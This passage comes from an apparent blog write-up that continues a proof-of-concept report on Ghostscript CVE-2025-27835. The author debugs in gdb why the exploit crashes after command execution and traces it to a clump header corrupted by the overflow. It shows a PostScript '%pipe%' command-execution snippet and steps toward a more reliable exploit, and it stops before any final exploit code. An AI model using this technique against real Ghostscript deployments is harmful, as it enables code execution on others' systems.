    <li><a href="#writing-to-arbitrary-memory">Writing to Arbitrary Memory</a>
      <ul>
        <li><a href="#getting-the-address-to-write-to">Getting the Address to Write To</a></li>
        <li><a href="#writing-to-the-address">Writing to the Address</a></li>
      </ul>
    </li>
    <li><a href="#turning-aslr-on">Turning ASLR On</a></li>
    <li><a href="#fixing-the-refcount-error">Fixing the Refcount Error</a></li>
    <li><a href="#removing-debug-symbols">Removing Debug Symbols</a></li>
    <li><a href="#final-exploit-code">Final Exploit Code</a></li>
  </ul>
</nav>
  </div>
</details>



            
            
          </div>
        </div>
      


      <div class="min-w-0 min-h-0 max-w-fit">
        



        <div class="article-content max-w-prose mb-20">
          <p>This article continues off of the <strong>PoC Report of Ghostscript CVE-2025-27835</strong> article before this one. I recommend reading that article first to understand the vulnerability and the exploit.</p>
<!-- 


  


 -->
<p>If you remember from the previous article, the goal was to make the exploit useful in a real-world scenario as if someone wanted to use it. The original PoC ended with an infinite loop after command execution and would segfault when the infinite loop was rmeoved. Although we theorized some ideas, we were not able to figure out how to make it work as we ran out of time, so I decided to continue working on it just for fun.</p>

<h2 class="relative group">Understanding the Crash 
    <div id="understanding-the-crash" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#understanding-the-crash" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>The first step was to understand why the exploit would crash after command execution. I started by commenting out/removing the infinite loop at the end of the exploit and running it until the crash in gdb. When running a postscript file in Ghostscript, most of the work is done in <code>interp</code> function inside <code>interp.c</code>. from parsing the input to defining variables and executing operators on them. When the interpreter detects that it should stop (such as with the <code>quit</code> operator) it returns from the <code>interp</code> function back to <code>main</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// /psi/gs.c
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="mi">68</span>  <span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="mi">94</span>      <span class="k">if</span> <span class="p">(</span><span class="n">code</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mi">95</span>          <span class="n">code</span> <span class="o">=</span> <span class="nf">gsapi_init_with_args</span><span class="p">(</span><span class="n">minst</span><span class="p">,</span> <span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="mi">119</span>     <span class="k">if</span> <span class="p">(</span><span class="n">code</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mi">120</span>         <span class="n">code</span> <span class="o">=</span> <span class="nf">gsapi_run_string</span><span class="p">(</span><span class="n">minst</span><span class="p">,</span> <span class="n">start_string</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">exit_status</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="mi">121</span>
</span></span><span class="line"><span class="cl"><span class="mi">122</span>     <span class="n">exit_status</span> <span class="o">=</span> <span class="nf">gsapi_exit</span><span class="p">(</span><span class="n">minst</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="mi">123</span>     <span class="k">if</span><span class="p">(</span> <span class="n">code</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">exit_status</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mi">124</span>         <span class="n">code</span> <span class="o">=</span> <span class="n">exit_status</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="mi">150</span>     <span class="k">return</span> <span class="n">exit_status</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="mi">151</span> <span class="p">}</span> 
</span></span></code></pre></div><p>The <code>interp</code> function is called from <code>gsapi_init_with_args</code> in line 95 of <code>gs.c</code> which is where most of the code execution happens from the PoC. When Ghostscript gets to the <code>quit</code> operator at the end of the PoC, it returns from <code>interp</code> back to <code>main</code> and then calls <code>gsapi_exit</code> in line 122 to invoke the garbage collector and free all allocated memory before gracefully exiting.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-postscript" data-lang="postscript"><span class="line"><span class="cl"><span class="s">(exec)</span> <span class="nf">=</span> <span class="nf">flush</span>
</span></span><span class="line"><span class="cl"><span class="s">(%pipe%ls -laf)</span> <span class="s">(w)</span> <span class="nf">file</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s">(done)</span> <span class="nf">=</span>
</span></span><span class="line"><span class="cl"><span class="c1">%{ 1 pop } loop
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="nf">quit</span>
</span></span></code></pre></div><p>Stopping at the line before the crash and looking at the backtrace it seems the issue is happening in <code>gc_objects_clear_marks</code>.</p>
<img src="./Images/crash_bt.jpg" alt="showing the backtrace right before the crash" style="display:block; margin:auto;">
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mi">605</span> <span class="cm">/* Unmark the objects in a clump. */</span>
</span></span><span class="line"><span class="cl"><span class="mi">606</span> <span class="k">static</span> <span class="kt">void</span>
</span></span><span class="line"><span class="cl"><span class="mi">607</span> <span class="nf">gc_objects_clear_marks</span><span class="p">(</span><span class="k">const</span> <span class="kt">gs_memory_t</span> <span class="o">*</span><span class="n">mem</span><span class="p">,</span> <span class="kt">clump_t</span> <span class="o">*</span> <span class="n">cp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mi">608</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="mi">609</span>     <span class="nf">if_debug_clump</span><span class="p">(</span><span class="sc">&#39;6&#39;</span><span class="p">,</span> <span class="n">mem</span><span class="p">,</span> <span class="s">&#34;[6]unmarking clump&#34;</span><span class="p">,</span> <span class="n">cp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="mi">610</span>     <span class="nf">SCAN_CLUMP_OBJECTS</span><span class="p">(</span><span class="n">cp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mi">611</span>         <span class="n">DO_ALL</span>
</span></span><span class="line"><span class="cl"><span class="mi">612</span>         <span class="nf">struct_proc_clear_marks</span><span class="p">((</span><span class="o">*</span><span class="n">proc</span><span class="p">))</span> <span class="o">=</span>
</span></span><span class="line"><span class="cl"><span class="mi">613</span>         <span class="n">pre</span><span class="o">-&gt;</span><span class="n">o_type</span><span class="o">-&gt;</span><span class="n">clear_marks</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="mi">614</span> <span class="err">#</span><span class="n">ifdef</span> <span class="n">DEBUG</span>
</span></span><span class="line"><span class="cl"><span class="mi">615</span>     <span class="k">if</span> <span class="p">(</span><span class="n">pre</span><span class="o">-&gt;</span><span class="n">o_type</span> <span class="o">!=</span> <span class="o">&amp;</span><span class="n">st_free</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mi">616</span>         <span class="nf">debug_check_object</span><span class="p">(</span><span class="n">pre</span><span class="p">,</span> <span class="n">cp</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="mi">617</span> <span class="err">#</span><span class="n">endif</span>
</span></span><span class="line"><span class="cl"><span class="mi">618</span>     <span class="nf">if_debug3m</span><span class="p">(</span><span class="sc">&#39;7&#39;</span><span class="p">,</span> <span class="p">(</span><span class="k">const</span> <span class="kt">gs_memory_t</span> <span class="o">*</span><span class="p">)</span><span class="n">mem</span><span class="p">,</span> <span class="s">&#34; [7](un)marking %s(%lu) &#34;</span><span class="n">PRI_INTPTR</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="mi">619</span>                <span class="nf">struct_type_name_string</span><span class="p">(</span><span class="n">pre</span><span class="o">-&gt;</span><span class="n">o_type</span><span class="p">),</span>
</span></span><span class="line"><span class="cl"><span class="mi">620</span>                <span class="p">(</span><span class="n">ulong</span><span class="p">)</span> <span class="n">size</span><span class="p">,</span> <span class="p">(</span><span class="kt">intptr_t</span><span class="p">)</span><span class="n">pre</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="mi">621</span>     <span class="nf">o_set_unmarked</span><span class="p">(</span><span class="n">pre</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="mi">622</span>     <span class="nf">if</span> <span class="p">(</span><span class="n">proc</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mi">623</span>         <span class="p">(</span><span class="o">*</span><span class="n">proc</span><span class="p">)</span> <span class="p">(</span><span class="n">mem</span><span class="p">,</span> <span class="n">pre</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">pre</span><span class="o">-&gt;</span><span class="n">o_type</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="mi">624</span>     <span class="n">END_OBJECTS_SCAN</span>
</span></span><span class="line"><span class="cl"><span class="mi">625</span> <span class="p">}</span>
</span></span></code></pre></div><p>The segfault occurs when attempting to run line 612:</p>
<p><code>struct_proc_clear_marks((*proc)) = pre-&gt;o_type-&gt;clear_marks;</code></p>
<img src="./Images/crash_assembly.jpg" alt="showing the assembly at the crash" style="display:block; margin:auto;">
<p>The comment above the function says that its purpose is to unmark objects in a clump. From the last article, I know that clumps are large allocations for objects that Ghostscript manages such as large buffers or arrays for Postscript defined variables. Printing out the data sturcture of a clump shows:</p>
<img src="./Images/ptype_cp.jpg" alt="showing the output of 'ptype cp'" style="display:block; margin:auto;">
<p>I wasn&rsquo;t really sure what each field meant or what it was for. So I decided to look into the line that crashed. There are a lot of macros in the code that I couldn&rsquo;t understand but gdb has a really useful command called <code>macro expand</code> that can be used to expand macros (if I recall correctly, this command only works when debugging with the <code>-g3</code> flag). Expanding lines 610 to 613 where the crash happens shows:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">obj_header_t</span> <span class="o">*</span><span class="n">pre</span> <span class="o">=</span> <span class="p">(</span><span class="kt">obj_header_t</span> <span class="o">*</span><span class="p">)((</span><span class="n">cp</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">cbase</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kt">obj_header_t</span> <span class="o">*</span><span class="n">end</span> <span class="o">=</span> <span class="p">(</span><span class="kt">obj_header_t</span> <span class="o">*</span><span class="p">)((</span><span class="n">cp</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">cbot</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="n">uint</span> <span class="n">size</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span> <span class="p">;</span> 
</span></span><span class="line"><span class="cl">    <span class="n">pre</span> <span class="o">&lt;</span> <span class="n">end</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">    <span class="n">pre</span> <span class="o">=</span> <span class="p">(</span><span class="kt">obj_header_t</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">pre</span> <span class="o">+</span> <span class="p">(</span><span class="kt">obj_size_t</span><span class="p">)((((</span><span class="n">size</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">obj_header_t</span><span class="p">))</span> <span class="o">+</span> <span class="p">(((((((</span><span class="mi">8</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">|</span> <span class="p">((</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">|</span> <span class="p">((</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span> <span class="o">&amp;</span> <span class="o">-</span><span class="p">((((((</span><span class="mi">8</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">|</span> <span class="p">((</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">|</span> <span class="p">((</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">size</span> <span class="o">=</span> <span class="p">((</span><span class="n">pre</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">d</span><span class="p">.</span><span class="n">o</span><span class="p">.</span><span class="n">size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">struct_proc_clear_marks</span><span class="p">((</span><span class="o">*</span><span class="n">proc</span><span class="p">))</span> <span class="o">=</span> <span class="n">pre</span><span class="o">-&gt;</span><span class="n">o_type</span><span class="o">-&gt;</span><span class="n">clear_marks</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></div><p>The <code>SCAN_CLUMP_OBJECTS</code> macro is used to iterate over all objects in a clump until the end of the clump is reached. The <code>DO_ALL</code> macro is used to set the <code>size</code> variable to the size of the current object. At the start, <code>pre</code> is set to the clump&rsquo;s <code>cbase</code> field which I can only assume is the start of the clump in memory and the <code>end</code> variable is set to the clump&rsquo;s <code>cbot</code> field which I&rsquo;m also assuming is the end of the clump in memory. When looking at the data type of <code>cbase</code> and <code>cbot</code> they are both <code>byte*</code> but the macro is casting them to <code>obj_header_t*</code>. Looking at the <code>obj_header_t</code> struct shows its just a union:</p>
<img src="./Images/ptype_pre.jpg" alt="showing the output of 'ptype pre'" style="display:block; margin:auto;">
<p>The union is filled with many more data types that I would need to manually print out since <code>ptype</code> does not recursively print out the data types. So I&rsquo;ll just print out <code>pre</code> with its type next to it in parenthesis from the <code>ptype</code> command:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">p</span> <span class="o">*</span><span class="n">pre</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="mi">3</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="p">(</span><span class="k">union</span> <span class="n">_d</span><span class="p">)</span> <span class="n">d</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="kt">obj_header_data_t</span><span class="p">)</span> <span class="n">o</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="p">(</span><span class="k">union</span> <span class="n">_f</span><span class="p">)</span> <span class="n">f</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="k">struct</span> <span class="n">_h</span><span class="p">)</span> <span class="n">h</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span> <span class="n">alone</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span> <span class="n">pad</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="k">struct</span> <span class="n">_m</span><span class="p">)</span> <span class="n">m</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span> <span class="n">_</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span> <span class="n">smark</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="k">struct</span> <span class="n">_b</span><span class="p">)</span> <span class="n">b</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span> <span class="n">_</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span> <span class="n">back</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
</span></span><span class="line"><span class="cl">      <span class="p">(</span><span class="kt">obj_size_t</span><span class="p">)</span> <span class="n">size</span> <span class="o">=</span> <span class="mi">1400</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="p">(</span><span class="k">union</span> <span class="n">_t</span><span class="p">)</span> <span class="n">t</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="kt">gs_memory_type_ptr_t</span><span class="p">)</span> <span class="n">type</span> <span class="o">=</span> <span class="mh">0x555557676ac0</span> <span class="o">&lt;</span><span class="n">st_alloc_save</span><span class="o">&gt;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span> <span class="n">reloc</span> <span class="o">=</span> <span class="mi">93825026976448</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="n">byte</span><span class="p">)</span> <span class="n">_pad</span> <span class="o">=</span> <span class="s">&#34;</span><span class="se">\000\000\000\000</span><span class="s">x</span><span class="se">\005\000\000\300</span><span class="s">jgWUU</span><span class="se">\000</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Knowing this, I can see that after <code>size</code> is set to <code>pre-&gt;d.o.size</code>, the next line that crashes is attempting to set a function pointer <code>proc</code> to <code>pre-&gt;d-&gt;o-&gt;t-&gt;type</code>. In the output above, that pointer is set to <code>st_alloc_save</code> and the output is from a valid clump before the crash.</p>
<p>Looking at <code>pre</code> right before the crash shows that something is wrong:</p>
<img src="./Images/p_pre_at_crash.jpg" alt="output of 'p pre' the line before the crash" style="display:block; margin:auto;">
<p><code>pre</code> is set to all zeros which means that the <code>cbase</code> field of the clump is set incorrectly. Since I didn&rsquo;t know why this was happening, it&rsquo;s time to go up to the caller of this function.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// /psi/igc.c
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="mi">267</span> <span class="nf">for_collected_spaces</span><span class="p">(</span><span class="n">ispace</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mi">268</span>     <span class="nf">for_space_clumps</span><span class="p">(</span><span class="n">ispace</span><span class="p">,</span> <span class="n">mem</span><span class="p">,</span> <span class="n">cp</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sw</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="mi">269</span>         <span class="nf">gc_objects_clear_marks</span><span class="p">((</span><span class="k">const</span> <span class="kt">gs_memory_t</span> <span class="o">*</span><span class="p">)</span><span class="n">mem</span><span class="p">,</span> <span class="n">cp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="mi">270</span>         <span class="nf">gc_strings_set_marks</span><span class="p">(</span><span class="n">cp</span><span class="p">,</span> <span class="nb">false</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="mi">271</span>     <span class="p">}</span>
</span></span></code></pre></div><p>Again, more macros. Expanding the macros shows:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="n">ispace</span> <span class="o">=</span> <span class="n">min_collect</span><span class="p">;</span> <span class="n">ispace</span> <span class="o">&lt;=</span> <span class="n">max_trace</span><span class="p">;</span> <span class="o">++</span><span class="n">ispace</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="n">mem</span> <span class="o">=</span> <span class="n">space_memories</span><span class="p">[</span><span class="n">ispace</span><span class="p">];</span> <span class="n">mem</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">mem</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">mem</span><span class="o">-&gt;</span><span class="n">saved</span><span class="o">-&gt;</span><span class="n">state</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="n">cp</span> <span class="o">=</span> <span class="nf">clump_splay_walk_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sw</span><span class="p">,</span> <span class="n">mem</span><span class="p">);</span> <span class="n">cp</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">cp</span> <span class="o">=</span> <span class="nf">clump_splay_walk_fwd</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sw</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="nf">gc_objects_clear_marks</span><span class="p">((</span><span class="k">const</span> <span class="kt">gs_memory_t</span> <span class="o">*</span><span class="p">)</span><span class="n">mem</span><span class="p">,</span> <span class="n">cp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nf">gc_strings_set_marks</span><span class="p">(</span><span class="n">cp</span><span class="p">,</span> <span class="nb">false</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Since <code>cbase</code> is corrupted, that means that the clump itself is corrupted. The for loop is iterating over all clumps in all memory spaces and clearing the marks on all objects in the clump. <code>cp</code> is originally set from <code>clump_splay_walk_init</code> and iterated on by the <code>clump_splay_walk_fwd</code> function. A splay tree is a type of data structure that moves recently accessed nodes closer to the root of the tree for faster access which Ghostscript seems to use for clumps. I won&rsquo;t go into the details of how Ghostscript uses splay trees but I will say that when setting the next clump with <code>clump_splay_walk_fwd</code>, it sets <code>cp</code> to an invalid pointer meaning that the pointer to the next clump is corrupted meaning that the splay tree is corrupted.</p>
<p>How did this happen? Well I went up the call stack again to the caller to see what is wrong but with no luck. I scraped this idea and thought of a different approach. Since I now know that a pointer to a clump is corrupted, I knew this had to be because of the buffer overflow. So I went back and looked at the hexdump of the memory between <code>SOURCE1</code> and <code>SOURCE2</code> before and after the buffer overflow.</p>

<h2 class="relative group">A New Approach 
    <div id="a-new-approach" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#a-new-approach" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>As a brief aside, I am using and have been using gdb with ASLR off so that I can get consistent addresses and know where everything is in memory across multiple runs which is why pointers in images always look similar.</p>
<img src="./Images/hexdump_before.jpg" alt="showing the hexdump before the overflow" style="display:block; margin:auto;">
<p>So the corrupted pointer is one of the 5 pointers in the image above. The most logical thing for me to do next was to set the memory back to what it was before the overflow after the overflow. I set a breakpoint right before the overflow, printed the hexdump, moved to the next instruction, and then set the memory back to what it was before the overflow.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">set</span> <span class="p">{</span><span class="kt">long</span><span class="p">}</span> <span class="mh">0x7ffff3688008</span><span class="o">=</span><span class="mh">0x00000000004c5002</span>
</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="p">{</span><span class="kt">long</span><span class="p">}</span> <span class="mh">0x7ffff3688010</span><span class="o">=</span><span class="mh">0x0000555557acff70</span>
</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="p">{</span><span class="kt">long</span><span class="p">}</span> <span class="mh">0x7ffff3688018</span><span class="o">=</span><span class="mh">0x0000555557acfd70</span>
</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="p">{</span><span class="kt">long</span><span class="p">}</span> <span class="mh">0x7ffff3688020</span><span class="o">=</span><span class="mh">0x00000000004c4b78</span>
</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="p">{</span><span class="kt">long</span><span class="p">}</span> <span class="mh">0x7ffff3688028</span><span class="o">=</span><span class="mh">0x000055555702ba00</span>
</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="p">{</span><span class="kt">long</span><span class="p">}</span> <span class="mh">0x7ffff3688030</span><span class="o">=</span><span class="mh">0x0000555556e6b671</span>
</span></span></code></pre></div><p>And it seemed to work:</p>
<img src="./Images/set_fix.jpg" alt="showing the output of the exploit after setting the memory back to what it was" style="display:block; margin:auto;">
<p>Why does this work? Well, I stopped at the line that would usually crash the program after I set the memory back to what it was before the overflow and <code>cp</code> was set to a valid pointer meaning <code>pre</code> was also valid. I&rsquo;m not sure how I didn&rsquo;t catch this earlier but the pointer that caused <code>cbase</code> to be corrupted was the address <code>0x7ffff3688058</code>. And if you look at the hexdump above, that address is one of the 5 pointers that are overwritten by the overflow.</p>
<p><strong>Corrupted cp pointer:</strong></p>
<img src="./Images/corrupted_cp.jpg" alt="showing the output of 'p *cp' the line before the crash without fixing" style="display:block; margin:auto;">
<p><strong>Fixed cp pointer after setting the memory back:</strong></p>
<img src="./Images/fixed_cp.jpg" alt="showing the output of 'p *cp' the line before the crash after fixing" style="display:block; margin:auto;">
<p><strong>pre after fixing corrupted pointer:</strong></p>
<img src="./Images/obj_headter_t_casted_pointer.jpg" alt="showing the output of casting the pointer to obj_header_t" style="display:block; margin:auto;">
<p>So this means that the overflow fills up the header/metadata of a clump between SOURCE1 and SOURCE2, causing it to crash when the garbage collector attempts to remove the marks from each clump after it attempts to access a corrupted clump.</p>
<p>Printing out <code>cp</code> shows that address <code>0x7ffff3688058</code> is <code>cbase</code> but it also shows that <code>0x7ffff3688040</code> is <code>chead</code>. I don&rsquo;t know what <code>chead</code> is since the hexdump shows there is no data between <code>0x7ffff3688040</code> and <code>0x7ffff3688058</code>, its just filled with zeros. But this checks off what one of the 5 unknown pointers in the hexdump above.</p>

<h2 class="relative group">Writing to Arbitrary Memory 
    <div id="writing-to-arbitrary-memory" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#writing-to-arbitrary-memory" aria-label="Anchor">#</a>
    </span>        
    
</h2>

<h3 class="relative group">Getting the Address to Write To 
    <div id="getting-the-address-to-write-to" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#getting-the-address-to-write-to" aria-label="Anchor">#</a>
    </span>        
    
</h3>
